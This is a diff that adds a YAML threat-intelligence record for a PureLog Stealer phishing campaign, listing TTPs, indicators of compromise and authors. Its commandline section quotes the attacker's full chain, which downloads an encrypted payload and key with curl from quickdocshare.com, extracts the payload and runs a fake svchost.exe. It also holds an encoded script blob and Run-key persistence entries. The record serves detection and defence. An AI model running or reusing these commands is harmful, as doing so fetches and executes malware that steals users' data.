@@ -1,0 +1,115 @@
+description: PureLog stealer campaign uses targeted phishing emails with language-matched
+  lures to deliver encrypted payloads via a Python-based loader and dual .NET loaders.
+malware_families:
+- PureLog Stealer
+TTPs:
+  processes:
+  - cmd.exe
+  - svchost.exe
+  - python.exe
+  - curl.exe
+  - chrome.exe
+  - msedge.exe
+  - explorer.exe
+  - conhost.exe
+  - cvires.exe
+  commandline:
+  - cmd.exe /c start "" ".\_document.pdf" && curl -A "curl/meow_meow" -s -k -L "https://quickdocshare.com/DQ"
+    -o ".\_invoice.pdf" && for /f "delims=" %i in ('curl -A "curl/meow_meow" -s -k
+    -L "https://quickdocshare.com/DQ/key"') do .\_FILE_2025__.png x -p"%i" ".\_invoice.pdf"
+    "C:\Users\Public\" -y >nul && del ".\_invoice.pdf" && cd "C:\Users\Public\Windows"
+    && svchost.exe "instructions.pdf"
+  - curl -A "curl/meow_meow" -s -k -L "https://quickdocshare.com/DQ" -o ".\_invoice.pdf"
+  - curl -A "curl/meow_meow" -s -k -L "https://quickdocshare.com/DQ/key"
+  - .\_FILE_2025__.png x -p"%i" ".\_invoice.pdf" "C:\Users\Public\" -y
+  - svchost.exe "instructions.pdf"
+  - powershell -NoProfile -WindowStyle Hidden -Command "Get-WmiObject -Namespace root/SecurityCenter2
+    -Class AntivirusProduct | ForEach-Object { $_.displayName }"
+  - C:\Program Files\Google\Chrome\Application\chrome.exe --type=renderer --user-data-dir="C:\Users\[REDACTED]\AppData\Local\Temp\qs4hg1fa.prl"
+    --extension-process --no-pre-read-main-dll --no-sandbox --disable-gpu-compositing
+    --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1.25
+    --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=9
+    --time-ticks-at-unix-epoch=-1770049222788996 --launch-time-ticks=353424829690
+    --metrics-shmem-handle=4156,i,299084443807041640,15390022656206001629,2097152
+    --field-trial-handle=2068,i,9344726561852850498,17132715209763330275,262144 --variations-seed-version
+    --trace-process-track-uuid=3190708994745248135 --mojo-platform-channel-handle=3988
+    /prefetch:9G
+  - svchost.exe -c "exec(base64...)"
+  - cmd.exe /c start *" "{script_path}"*
+  - chrome.exe --disable-fre no-default-browser-check ...
+  powershell:
+  - Get-WmiObject -Namespace root/SecurityCenter2 -Class AntivirusProduct | ForEach-Object
+    { $_.displayName }
+  - Get-WmiObject -Namespace root/SecurityCenter2 Class AntivirusProduct | ForEach-Object
+    { $_displayName }
+  scripting_engine:
+  - H4sIAAAAAAAEAFN6ysj1iJHrPiOXgpuLoZmbq7Ori6OTqbmTgZEpkDZ2dLF0djRxtrAwchNgVDIIz8xLyS8vVnBJTUvNS0kt0lEIKQIyFHwzk4vyFRwLUisU/PNSFRzzSjLLMotKi7UEYDoMDRXMTJwyS4xYTfSM9QysWEKLU4uchBOTilJLMlKLMpOzo/2DPRzDHWM9Dm5lDuIxM9EzMdAzNDXRszSLYvbTd0xgKWIHWptYmlNSpexsFQPSXxwTUJqUk5kcA7UlprgsOSO/uEQvtSK1iZHbIEXBIEPBIFfBoBgAZeNq1egAAAA=
+  - import ctypeskernel3a = ctypes.WinDLL("kernel32")
+  - import winreg, os, sys
+  - import ctypes, struct, zlib, user32 = ctypes.windll.user32gdi32 = ctypes.windll.gdi32
+  - import os, subprocess
+  - import json, base64, urllib.request
+  registry_keys:
+  - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+  - HKEY_CURRENT_USER\Software\Microsoft\Windows\StateRepository\AppModel\CacheVersion
+  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+  image_load:
+  - C:\Users\Public\Windows\python314.dll
+  - C:\Users\Public\Windows\DLLs\_ctypes.pyd
+  - C:\Users\Public\Windows\DLLs\libffi-8.dll
+  - C:\Users\Public\Windows\DLLs\_hashlib.pyd
+  - C:\Users\Public\Windows\DLLs\libcrypto-3.dll
+  - C:\Users\Public\Windows\DLLs\_socket.pyd
+  - C:\Users\Public\Windows\DLLs\_ssl.pyd
+  - C:\Users\Public\Windows\DLLs\libssl-3.dll
+  - C:\Users\Public\Windows\DLLs\_bz2.pyd
+  - C:\Users\Public\Windows\DLLs\_lzma.pyd
+  - C:\Users\Public\Windows\DLLs\_zstd.pyd
+  network_connections:
+  - cmd.exe -> quickdocshare.com:80
+  - curl.exe -> quickdocshare.com:80
+  - svchost.exe -> 172.64.80.1:80
+  - svchost.exe -> 166.0.184.127:80
+  - svchost.exe -> 64.40.154.96:80
+  - svchost.exe -> quickdocshare[.]com/DQ
+  - svchost.exe -> quickdocshare[.]com/DQ/key
+  file_activity:
+  - C:\Users\Public\
+  - C:\Users\Public\Windows\
+  - .\_document.pdf
+  - .\_invoice.pdf
+  - .\_FILE_2025__.png
+  - svchost.exe
+  - instructions.pdf
+  - urlmon.dll
+  - C:\Users\Public\Windows\svchost.exe
+  - C:\Users\Public\Windows\Instructions.pdf
+  - C:\Users\Public\Windows\TR S R PRy 2
+  - C:\Users\Public\Windows\ TR S R PRy 1
+  - C:\Users
+  persistence:
+  - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run -> SystemSettings
+  process_relations:
+  - cmd.exe -> svchost.exe
+  - svchost.exe -> chrome.exe
+IOCs:
+  hashes:
+  - 35efc4b75a1d70c38513b4dfe549da417aaa476bf7e9ebd00265aaa8c7295870
+  - 1539dab6099d860add8330bf2a008a4b6dc05c71f7b4439aebf431e034e5b6ff
+  - ac591adea9a2305f9be6ae430996afd9b7432116f381b638014a0886a99c6287
+  - f4532fc1e5d53a732fcc883f7125ceb06b985048
+  ip_addresses:
+  - 172.64.80.1
+  - 166.0.184.127
+  - 64.40.154.96
+  domains:
+  - quickdocshare.com
+  - mh.bestshopingday.com
+  - logs.bestsaleshoppingday.com
+authors:
+- Mohamed Fahmy
+- Allixon Kristoffer Francisco
+- Jonna Santos
+reference: https://www.trendmicro.com/en_us/research/26/c/copyright-lures-mask-a-multistage-purelog-stealer-attack.html
+date_of_publication: March 19, 2026
+file_creation_date: March 19, 2026
